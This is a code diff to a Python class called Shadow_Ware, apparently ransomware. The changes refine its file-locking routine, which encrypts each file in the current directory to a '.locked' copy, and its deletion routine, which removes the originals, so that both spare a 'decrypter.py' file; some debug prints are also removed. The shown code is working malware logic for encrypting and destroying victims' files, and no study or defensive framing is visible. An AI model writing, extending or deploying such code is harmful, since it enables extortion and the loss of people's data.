@@ -20,10 +20,6 @@ class Shadow_Ware():
     # Current Dir
     self.current_dir = os.path.dirname(__file__)
 
-    # Print files
-    print(self.get_file_in_dir(self.current_dir))
-    print(self.get_dir_in_dir(self.current_dir))
-
   # Inital code to setup data used for encyrption
   def get_key(self):
     key = ""
@@ -79,7 +75,7 @@ class Shadow_Ware():
   def encrypt_all_files(self):
     files = self.get_all_files(self.current_dir)
     for file in files:
-      if file not in self.ignored_files:
+      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
         print("Locking file " + file)
         self.encrypt_file(file, file + ".locked")
 
@@ -88,8 +84,9 @@ class Shadow_Ware():
     files = self.get_all_files(self.current_dir)
     script_path = os.path.abspath(__file__)
     id_file_path = os.path.join(self.current_dir, "ID.id")
+    decrypter_file_path = os.path.abspath("decrypter.py")
     for file in files:
-        if (file not in self.ignored_files) and (not file.endswith(".locked")) and (file != script_path and file != id_file_path):
+        if (file not in self.ignored_files) and (not file.endswith(".locked")) and (file != script_path and file != id_file_path and file != decrypter_file_path):
             print("Removed " + file)
             os.remove(file)
 
